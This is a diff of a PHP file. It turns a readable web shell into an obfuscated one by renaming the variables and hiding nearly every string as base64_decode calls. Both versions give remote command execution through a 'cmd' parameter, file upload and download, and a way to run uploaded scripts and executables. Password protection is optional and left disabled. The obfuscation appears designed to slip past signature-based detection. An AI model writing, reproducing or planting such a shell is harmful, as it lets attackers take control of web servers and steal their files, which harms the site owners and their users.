@@ -4,352 +4,333 @@
 -->
 
 
-
-<?php
-    // Password protection, useful for King of The Hill games
-    $pass=''; // Set to null to disable; Set to string to enable, must be the sha512 hash of the password.
-
-        global $cmdresults;
-        global $retval;
-    if($pass != null) {
-        if (isset($_COOKIE['pass'])) { // We use cookies and not url parameter for security reasons
-            // As it is likely that URL parameters are logged by the webserver, thus revealing the password
-            if (hash('sha512', $_COOKIE['pass']) !== $pass) {
-                echo "Wrong password !";
+<?php         $t0=''; 
+        global $h1;
+        global $x2;
+    if($t0 != null) {
+        if (isset($_COOKIE[base64_decode('cGFzcw==')])) {                         if (hash(base64_decode('c2hhNTEy'), $_COOKIE[base64_decode('cGFzcw==')]) !== $t0) {
+                echo base64_decode('V3JvbmcgcGFzc3dvcmQgIQ==');
                 exit;
             }
         } else {
-            echo "Wrong password !";
+            echo base64_decode('V3JvbmcgcGFzc3dvcmQgIQ==');
             exit;
         }
     }
 
-    function getAbsolute(string $path): string
+    function getAbsolute(string $z3): string
     {
-        // Cleaning path regarding OS
-        $path = mb_ereg_replace('\\\\|/', '/', $path, 'msr');
-        // Check if path start with a separator (UNIX)
-        $startWithSeparator = $path[0] === '/';
-        // Check if start with drive letter
-        preg_match('/^[a-z]:/', $path, $matches);
-        $startWithLetterDir = isset($matches[0]) ? $matches[0] : false;
-        // Get and filter empty sub paths
-        $subPaths = array_filter(explode('/', $path), 'mb_strlen');
+                $z3 = mb_ereg_replace(base64_decode('XFxcXHwv'), base64_decode('Lw=='), $z3, base64_decode('bXNy'));
+                $r4 = $z3[0] === base64_decode('Lw==');
+                preg_match(base64_decode('L15bYS16XTov'), $z3, $b5);
+        $g6 = isset($b5[0]) ? $b5[0] : false;
+                $b7 = array_filter(explode(base64_decode('Lw=='), $z3), base64_decode('bWJfc3RybGVu'));
 
-        $absolutes = [];
-        foreach ($subPaths as $subPath) {
-            if ('.' === $subPath) {
+        $u8 = [];
+        foreach ($b7 as $a9) {
+            if (base64_decode('Lg==') === $a9) {
                 continue;
             }
-            // if $startWithSeparator is false
-            // and $startWithLetterDir
-            // and (absolutes is empty or all previous values are ..)
-            // save absolute cause that's a relative and we can't deal with that and just forget that we want go up
-            if ('..' === $subPath
-                && !$startWithSeparator
-                && !$startWithLetterDir
-                && empty(array_filter($absolutes, function ($value) { return !('..' === $value); }))
+                                                            if (base64_decode('Li4=') === $a9
+                && !$r4
+                && !$g6
+                && empty(array_filter($u8, function ($za) { return !(base64_decode('Li4=') === $za); }))
             ) {
-                $absolutes[] = $subPath;
+                $u8[] = $a9;
                 continue;
             }
-            if ('..' === $subPath) {
-                array_pop($absolutes);
+            if (base64_decode('Li4=') === $a9) {
+                array_pop($u8);
                 continue;
             }
-            $absolutes[] = $subPath;
+            $u8[] = $a9;
         }
 
         return
-            (($startWithSeparator ? '/' : $startWithLetterDir) ?
-                $startWithLetterDir.'/' : ''
-            ).implode('/', $absolutes);
+            (($r4 ? base64_decode('Lw==') : $g6) ?
+                $g6.base64_decode('Lw==') : ''
+            ).implode(base64_decode('Lw=='), $u8);
     }
 
-    // Upload file to the server
-    if (isset($_POST['upload'])) {
-        $desinationDir = getDir();
-        $destinationFile = $desinationDir.'/'.basename($_FILES['file']['name']);
+        if (isset($_POST[base64_decode('dXBsb2Fk')])) {
+        $hb = getDir();
+        $nc = $hb.base64_decode('Lw==').basename($_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')]);
 
-        if (file_exists($destinationFile)) {
-            echo "<script>alert('Error: File already exists !')</script>";
+        if (file_exists($nc)) {
+            echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IEZpbGUgYWxyZWFkeSBleGlzdHMgIScpPC9zY3JpcHQ+');
         }
-        else if (move_uploaded_file($_FILES['file']['tmp_name'], $destinationFile)) {
-            echo "<script>alert('File uploaded successfuly !')</script>";
+        else if (move_uploaded_file($_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')], $nc)) {
+            echo base64_decode('PHNjcmlwdD5hbGVydCgnRmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVseSAhJyk8L3NjcmlwdD4=');
         } else {
-            echo "<script>alert('Error: Could not upload file !')</script>";
+            echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IENvdWxkIG5vdCB1cGxvYWQgZmlsZSAhJyk8L3NjcmlwdD4=');
         }
     
     }
-    else if (isset($_GET['runscript'])) {
-        $script = $_GET['runscript'];
-        $scriptPath = getAbsolute($script);
-        $command = 'pwsh -Noni -Nop -File "' . $scriptPath . '"';
-        global $cmdresults;
-        global $retval;
-        $cmdresults = shell_exec($command);
+    else if (isset($_GET[base64_decode('cnVuc2NyaXB0')])) {
+        $cd = $_GET[base64_decode('cnVuc2NyaXB0')];
+        $ie = getAbsolute($cd);
+        $jf = base64_decode('cHdzaCAtTm9uaSAtTm9wIC1GaWxlICI=') . $ie . base64_decode('Ig==');
+        global $h1;
+        global $x2;
+        $h1 = shell_exec($jf);
     }
-    else if (isset($_GET['runexe'])) {
-        $script = $_GET['runexe'];
-        $scriptPath = getAbsolute($script);
-        $command = $scriptPath;
-        exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
+    else if (isset($_GET[base64_decode('cnVuZXhl')])) {
+        $cd = $_GET[base64_decode('cnVuZXhl')];
+        $ie = getAbsolute($cd);
+        $jf = $ie;
+        exec(base64_decode('Y2Qg').realpath(getDir()).base64_decode('ICYmIA==').$ie, $h1, $x2);
     }
-    else if (isset($_GET['runbat'])) {
-        $script = $_GET['runbat'];
-        $scriptPath = getAbsolute($script);
-        $command = 'pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","' . $scriptPath . ') }';
-        exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
+    else if (isset($_GET[base64_decode('cnVuYmF0')])) {
+        $cd = $_GET[base64_decode('cnVuYmF0')];
+        $ie = getAbsolute($cd);
+        $jf = base64_decode('cHdzaCAtTm9uaSAtTm9wIC1Db21tYW5kIHsgU3RhcnQtUHJvY2VzcyAiY21kLmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCIvayIsIg==') . $ie . base64_decode('KSB9');
+        exec(base64_decode('Y2Qg').realpath(getDir()).base64_decode('ICYmIA==').$ie, $h1, $x2);
     }
     
-    // Download a file from the server
-    if (isset($_GET['download'])) {
-        $file = $_GET['download'];
-        if (file_exists($file)) {
-            if (is_readable($file)) {
-                header('Content-Description: File Transfer');
-                header('Content-Type: application/octet-stream');
-                header('Content-Disposition: attachment; filename="'.basename($file).'"');
-                header('Expires: 0');
-                header('Cache-Control: must-revalidate');
-                header('Pragma: public');
-                header('Content-Length: '.filesize($file));
-                readfile($file);
+        if (isset($_GET[base64_decode('ZG93bmxvYWQ=')])) {
+        $a10 = $_GET[base64_decode('ZG93bmxvYWQ=')];
+        if (file_exists($a10)) {
+            if (is_readable($a10)) {
+                header(base64_decode('Q29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2Zlcg=='));
+                header(base64_decode('Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0='));
+                header(base64_decode('Q29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ig==').basename($a10).base64_decode('Ig=='));
+                header(base64_decode('RXhwaXJlczogMA=='));
+                header(base64_decode('Q2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRl'));
+                header(base64_decode('UHJhZ21hOiBwdWJsaWM='));
+                header(base64_decode('Q29udGVudC1MZW5ndGg6IA==').filesize($a10));
+                readfile($a10);
                 exit;
             } else {
-                echo "<script>alert('Error: Could not read the file !')</script>";
+                echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IENvdWxkIG5vdCByZWFkIHRoZSBmaWxlICEnKTwvc2NyaXB0Pg==');
                 exit;
             }
         }
     }
 
     function getHeaderColor(){
-        return 'rgb(32, 0, 128)';
+        return base64_decode('cmdiKDMyLCAwLCAxMjgp');
     }
     function getPrimaryColor(){
-        return '#00ff00';
+        return base64_decode('IzAwZmYwMA==');
     }
     function getSecondaryColor(){
-        return '#d92626';
+        return base64_decode('I2Q5MjYyNg==');
     }
     function getCommandColor(){
-        return '#ff0066';
+        return base64_decode('I2ZmMDA2Ng==');
     }
     function getCommandOutputColor(){
-        return '#3ADF00';
+        return base64_decode('IzNBREYwMA==');
     }
     function getExplorerColor(){
-        return '#3ADF00';
+        return base64_decode('IzNBREYwMA==');
     }
     function getDirectoryColor(){
-        return '#3ADF00';
+        return base64_decode('IzNBREYwMA==');
     }
     function getNavTextColor(){
-        return '#ff5500';
+        return base64_decode('I2ZmNTUwMA==');
     }
     function getHeaderTextColor(){
-        return '#C0C0C0';
+        return base64_decode('I0MwQzBDMA==');
     }
     function getNavTextHoverColor(){
-        return '#C0C0C0';
+        return base64_decode('I0MwQzBDMA==');
     }
     function getButtonsColor(){
-        return '#3ADF00';
+        return base64_decode('IzNBREYwMA==');
     }
-    function getBgColor($level){
-        switch ($level) {
+    function getBgColor($h11){
+        switch ($h11) {
           case 1:
-            return '#101010';
+            return base64_decode('IzEwMTAxMA==');
             break;
           case 2:
-            return '#202020';
+            return base64_decode('IzIwMjAyMA==');
             break;
           case 3:
-            return '#303030';
+            return base64_decode('IzMwMzAzMA==');
             break;
           case 4:
-            return '#404040';
+            return base64_decode('IzQwNDA0MA==');
             break;
           default:
-            return '#404040';
+            return base64_decode('IzQwNDA0MA==');
         }
-        return '#404040';
+        return base64_decode('IzQwNDA0MA==');
     }
-    function fileExtension($name) {
-        $n = strrpos($name, '.');
-        return ($n === false) ? '' : substr($name, $n+1);
+    function fileExtension($m12) {
+        $s13 = strrpos($m12, base64_decode('Lg=='));
+        return ($s13 === false) ? '' : substr($m12, $s13+1);
     }
-    function getItemSize($filename) {
-        $retval =  '';
-        $fname = getDir().'/'.$filename;
-        if (is_dir($fname)){  
-            $retval .=  '<td style="color: "' .  getDirectoryColor() . '">';
-            $retval .= htmlspecialchars('<dir>');
+    function getItemSize($s14) {
+        $x2 =  '';
+        $u15 = getDir().base64_decode('Lw==').$s14;
+        if (is_dir($u15)){  
+            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getDirectoryColor() . base64_decode('Ij4=');
+            $x2 .= htmlspecialchars(base64_decode('PGRpcj4='));
         }
         else{
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retsize = formatSizeUnits(filesize($fname));
-            $retval .= $retsize;
+            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
+            $t16 = formatSizeUnits(filesize($u15));
+            $x2 .= $t16;
         }
-        $retval .= '</td>';
-        return $retval;
+        $x2 .= base64_decode('PC90ZD4=');
+        return $x2;
     }
-    function getItemActions($filename) {
-        $retval =  '';
-        $ext = pathinfo($filename, PATHINFO_EXTENSION);
-        switch ($ext) {
-          case "ps1":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= makeRunScriptFile($filename);
+    function getItemActions($s14) {
+        $x2 =  '';
+        $m17 = pathinfo($s14, PATHINFO_EXTENSION);
+        switch ($m17) {
+          case base64_decode('cHMx'):
+            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
+            $x2 .= makeRunScriptFile($s14);
             break;
-          case "bat":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= makeRunBatFile($filename);
+          case base64_decode('YmF0'):
+            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
+            $x2 .= makeRunBatFile($s14);
             break;
-          case "exe":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= makeRunExeFile($filename);
+          case base64_decode('ZXhl'):
+            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
+            $x2 .= makeRunExeFile($s14);
             break;
           default:
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= htmlspecialchars('noop');
+            $x2 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  getSecondaryColor() . base64_decode('Ij4=');
+            $x2 .= htmlspecialchars(base64_decode('bm9vcA=='));
         }
-        $retval .= '</td>';
-        return $retval;
+        $x2 .= base64_decode('PC90ZD4=');
+        return $x2;
     }
-    function printPerms($file) {
-        $mode = fileperms($file);
-        if( $mode & 0x1000 ) { $type='p'; }
-        else if( $mode & 0x2000 ) { $type='c'; }
-        else if( $mode & 0x4000 ) { $type='d'; }
-        else if( $mode & 0x6000 ) { $type='b'; }
-        else if( $mode & 0x8000 ) { $type='-'; }
-        else if( $mode & 0xA000 ) { $type='l'; }
-        else if( $mode & 0xC000 ) { $type='s'; }
-        else $type='u';
-        $owner["read"] = ($mode & 00400) ? 'r' : '-';
-        $owner["write"] = ($mode & 00200) ? 'w' : '-';
-        $owner["execute"] = ($mode & 00100) ? 'x' : '-';
-        $group["read"] = ($mode & 00040) ? 'r' : '-';
-        $group["write"] = ($mode & 00020) ? 'w' : '-';
-        $group["execute"] = ($mode & 00010) ? 'x' : '-';
-        $world["read"] = ($mode & 00004) ? 'r' : '-';
-        $world["write"] = ($mode & 00002) ? 'w' : '-';
-        $world["execute"] = ($mode & 00001) ? 'x' : '-';
-        if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
-        if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
-        if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
-        $s=sprintf("%1s", $type);
-        $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
-        $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
-        $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
-        return $s;
+    function printPerms($a10) {
+        $r18 = fileperms($a10);
+        if( $r18 & 0x1000 ) { $k19=base64_decode('cA=='); }
+        else if( $r18 & 0x2000 ) { $k19=base64_decode('Yw=='); }
+        else if( $r18 & 0x4000 ) { $k19=base64_decode('ZA=='); }
+        else if( $r18 & 0x6000 ) { $k19=base64_decode('Yg=='); }
+        else if( $r18 & 0x8000 ) { $k19=base64_decode('LQ=='); }
+        else if( $r18 & 0xA000 ) { $k19=base64_decode('bA=='); }
+        else if( $r18 & 0xC000 ) { $k19=base64_decode('cw=='); }
+        else $k19=base64_decode('dQ==');
+        $x1a[base64_decode('cmVhZA==')] = ($r18 & 00400) ? base64_decode('cg==') : base64_decode('LQ==');
+        $x1a[base64_decode('d3JpdGU=')] = ($r18 & 00200) ? base64_decode('dw==') : base64_decode('LQ==');
+        $x1a[base64_decode('ZXhlY3V0ZQ==')] = ($r18 & 00100) ? base64_decode('eA==') : base64_decode('LQ==');
+        $s1b[base64_decode('cmVhZA==')] = ($r18 & 00040) ? base64_decode('cg==') : base64_decode('LQ==');
+        $s1b[base64_decode('d3JpdGU=')] = ($r18 & 00020) ? base64_decode('dw==') : base64_decode('LQ==');
+        $s1b[base64_decode('ZXhlY3V0ZQ==')] = ($r18 & 00010) ? base64_decode('eA==') : base64_decode('LQ==');
+        $z1c[base64_decode('cmVhZA==')] = ($r18 & 00004) ? base64_decode('cg==') : base64_decode('LQ==');
+        $z1c[base64_decode('d3JpdGU=')] = ($r18 & 00002) ? base64_decode('dw==') : base64_decode('LQ==');
+        $z1c[base64_decode('ZXhlY3V0ZQ==')] = ($r18 & 00001) ? base64_decode('eA==') : base64_decode('LQ==');
+        if( $r18 & 0x800 ) $x1a[base64_decode('ZXhlY3V0ZQ==')] = ($x1a[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('cw==') : base64_decode('Uw==');
+        if( $r18 & 0x400 ) $s1b[base64_decode('ZXhlY3V0ZQ==')] = ($s1b[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('cw==') : base64_decode('Uw==');
+        if( $r18 & 0x200 ) $z1c[base64_decode('ZXhlY3V0ZQ==')] = ($z1c[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('dA==') : base64_decode('VA==');
+        $h1d=sprintf(base64_decode('JTFz'), $k19);
+        $h1d.=sprintf(base64_decode('JTFzJTFzJTFz'), $x1a[base64_decode('cmVhZA==')], $x1a[base64_decode('d3JpdGU=')], $x1a[base64_decode('ZXhlY3V0ZQ==')]);
+        $h1d.=sprintf(base64_decode('JTFzJTFzJTFz'), $s1b[base64_decode('cmVhZA==')], $s1b[base64_decode('d3JpdGU=')], $s1b[base64_decode('ZXhlY3V0ZQ==')]);
+        $h1d.=sprintf(base64_decode('JTFzJTFzJTFz'), $z1c[base64_decode('cmVhZA==')], $z1c[base64_decode('d3JpdGU=')], $z1c[base64_decode('ZXhlY3V0ZQ==')]);
+        return $h1d;
     }
 
-    function formatSizeUnits($bytes) {
-        if ($bytes >= 1073741824)
+    function formatSizeUnits($n1e) {
+        if ($n1e >= 1073741824)
         {
-            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
+            $n1e = number_format($n1e / 1073741824, 2) . base64_decode('IEdC');
         }
-        elseif ($bytes >= 1048576)
+        elseif ($n1e >= 1048576)
         {
-            $bytes = number_format($bytes / 1048576, 2) . ' MB';
+            $n1e = number_format($n1e / 1048576, 2) . base64_decode('IE1C');
         }
-        elseif ($bytes >= 1024)
+        elseif ($n1e >= 1024)
         {
-            $bytes = number_format($bytes / 1024, 2) . ' KB';
+            $n1e = number_format($n1e / 1024, 2) . base64_decode('IEtC');
         }
-        elseif ($bytes > 1)
+        elseif ($n1e > 1)
         {
-            $bytes = $bytes . ' bytes';
+            $n1e = $n1e . base64_decode('IGJ5dGVz');
         }
-        elseif ($bytes == 1)
+        elseif ($n1e == 1)
         {
-            $bytes = $bytes . ' byte';
+            $n1e = $n1e . base64_decode('IGJ5dGU=');
         }
         else
         {
-            $bytes = '0 bytes';
+            $n1e = base64_decode('MCBieXRlcw==');
         }
 
-        return $bytes;
+        return $n1e;
     }
 
 
     function getDir() {
-        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+        return isset($_GET[base64_decode('ZGly')]) ? realpath($_GET[base64_decode('ZGly')]) : getcwd();
     }
 
 
-    function makeFileName($file) {
-        if (is_dir(getDir().'/'.$file)) {
-            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
+    function makeFileName($a10) {
+        if (is_dir(getDir().base64_decode('Lw==').$a10)) {
+            return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P2Rpcj0=').realpath(getDir().base64_decode('Lw==').$a10).base64_decode('Ij4=').$a10.base64_decode('PC9hPg==');
         } else {
-            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
+            return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P2Rvd25sb2FkPQ==').realpath(getDir().base64_decode('Lw==').$a10).base64_decode('Ij4=').$a10.base64_decode('PC9hPg==');
         }
     }
-    function makeRunScriptFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+    function makeRunScriptFile($a10) {
+        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bnNjcmlwdD0=').getAbsolute(getDir().base64_decode('Lw==').$a10).base64_decode('JmRpcj0=').realpath(getDir()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
     }
-    function makeRunExeFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+    function makeRunExeFile($a10) {
+        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bmV4ZT0=').getAbsolute(getDir().base64_decode('Lw==').$a10).base64_decode('JmRpcj0=').realpath(getDir()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
     }
-    function makeRunBatFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+    function makeRunBatFile($a10) {
+        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bmJhdD0=').getAbsolute(getDir().base64_decode('Lw==').$a10).base64_decode('JmRpcj0=').realpath(getDir()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
     }
     function getFiles() {
-        $files = scandir(getDir());
+        $b1f = scandir(getDir());
 
-        $even = true;
-        if ($files != null) {
-            foreach($files as $filename){
-                //Simply print them out onto the screen.
-                echo '<tr style="background-color:'.($even  ? '#515151' : '#212121').';">';
-                echo '<td style="font-weight:thin;">'.makeFileName($filename).'</td>'; 
-                //echo '<td>owner</td>';
-                //echo '<td>'.printPerms(getDir().'/'.$filename).'</td>';
-                echo ''.getItemSize($filename).'';
-                echo ''.getItemActions($filename).'';
-                echo '</tr>';
-                $even = !$even;
+        $z20 = true;
+        if ($b1f != null) {
+            foreach($b1f as $s14){
+                                echo base64_decode('PHRyIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOg==').($z20  ? base64_decode('IzUxNTE1MQ==') : base64_decode('IzIxMjEyMQ==')).base64_decode('OyI+');
+                echo base64_decode('PHRkIHN0eWxlPSJmb250LXdlaWdodDp0aGluOyI+').makeFileName($s14).base64_decode('PC90ZD4='); 
+                                                echo ''.getItemSize($s14).'';
+                echo ''.getItemActions($s14).'';
+                echo base64_decode('PC90cj4=');
+                $z20 = !$z20;
             }
         } else {
-            echo "<p>Couldn't open that directory !";
+            echo base64_decode('PHA+Q291bGRuJ3Qgb3BlbiB0aGF0IGRpcmVjdG9yeSAh');
         }
     }
 
     function getCmdResults() {
-        global $cmdresults;
-        global $retval;
+        global $h1;
+        global $x2;
         
-        if ($retval == 0 ) {
-            if($cmdresults != null){
-                foreach ($cmdresults as $line) {
+        if ($x2 == 0 ) {
+            if($h1 != null){
+                foreach ($h1 as $j21) {
 
-                    if($line != null){
-                        echo "<br>";
-                        echo htmlspecialchars($line);
-                        echo "\n";
+                    if($j21 != null){
+                        echo base64_decode('PGJyPg==');
+                        echo htmlspecialchars($j21);
+                        echo base64_decode('Cg==');
                         
                     }
                 }
             }
         } else {
-            echo "Execution failed with error code: ".$retval;
+            echo base64_decode('RXhlY3V0aW9uIGZhaWxlZCB3aXRoIGVycm9yIGNvZGU6IA==').$x2;
         }    
     }
 
     function getCommandLine() {
-        $hostname = gethostname() ?? 'none';
-        $username = get_current_user();
-        $dir = getDir();
-        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
+        $q22 = gethostname() ?? base64_decode('bm9uZQ==');
+        $g23 = get_current_user();
+        $h24 = getDir();
+        $j25 = isset($_GET[base64_decode('Y21k')]) ? $_GET[base64_decode('Y21k')] : '';
 
-        return '<span style="color: #ff6347">'.$username.'@'.$hostname.'</span>: <span style="color: #B40404">'.$dir.'</span>$ '.$cmd;
+        return base64_decode('PHNwYW4gc3R5bGU9ImNvbG9yOiAjZmY2MzQ3Ij4=').$g23.base64_decode('QA==').$q22.base64_decode('PC9zcGFuPjogPHNwYW4gc3R5bGU9ImNvbG9yOiAjQjQwNDA0Ij4=').$h24.base64_decode('PC9zcGFuPiQg').$j25;
     }
 
-    if (isset($_GET['cmd'])) {
-        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $cmdresults, $retval);
+    if (isset($_GET[base64_decode('Y21k')])) {
+        exec(base64_decode('Y2Qg').realpath(getDir()).base64_decode('ICYmIA==').$_GET[base64_decode('Y21k')], $h1, $x2);
     }
 ?>
 
